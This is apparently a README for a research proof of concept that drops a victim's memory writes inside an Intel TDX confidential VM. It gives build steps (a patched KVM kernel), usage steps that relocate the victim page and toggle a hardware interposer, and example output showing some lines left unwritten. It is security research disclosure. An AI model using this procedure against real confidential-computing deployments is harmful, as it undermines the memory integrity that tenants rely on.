# Simple drop write attack on TDX

This is a PoC for a drop write attack on a TDX VM. It assumes a cooperative
debug scenario where a victim and attack are manually synchronized through a
CLI interface.

The victim TD will:
* Initialize its buffer with all zeros.
* Overwrite the buffer with all ones.
* Print the final buffer.

The attacker aims to drop the victim's write, resulting in a buffer containing zeros.

## Build

Building this PoC, requires you to follow the README in `../patches` to apply the KVM patch to your kernel. You will need to recompile the whole kernel. The folder contains a README with more instructions.

Afterwards, you can build the attack code with `make`.

This will build the following artifact
- `./build/binaries/ddrop-vm-victim`

## Use

1) Copy `ddrop-vm-victim` to the VM and run it with sudo. Let <VICTIM_GPA> be the gpa shown in the `Guest physical address: ...` line
2) Then relocate the victim buffer using `sudo python ./relocate.py --gpa <VICTIM GPA> --hpa <TARGET HPA>`
3) The python script relocate the victim page using `TDH.MEM.PAGE.RELOCATE`
4) Follow the instructions from the binary.


If successful, the final value for the memory buffer displayed by `ddrop-vm-victim` should contain zeros instead of all `0xff`. Note that not all lines will be zero due to subchannel interleaving. See below for expected output.


## Example output

If the attack was successful, certain cache lines within the victim buffer should be zero. Note that not all cache lines are affected due to subchannel interleaving. 

### TDX Victim

```
$ sudo ./ddrop-vm-victim
Allocated memory buffer of 4096 bytes
 --> Guest virtual address: 0x7ef2b0205000
 --> Guest physical address: 0x1aaf4000

Move page, then press enter

Buffer initialized to zero:
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

Enable the interposer, then press enter

Setting buffer to 0xff

Disable the interposer, then press enter

Printing memory buffer
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
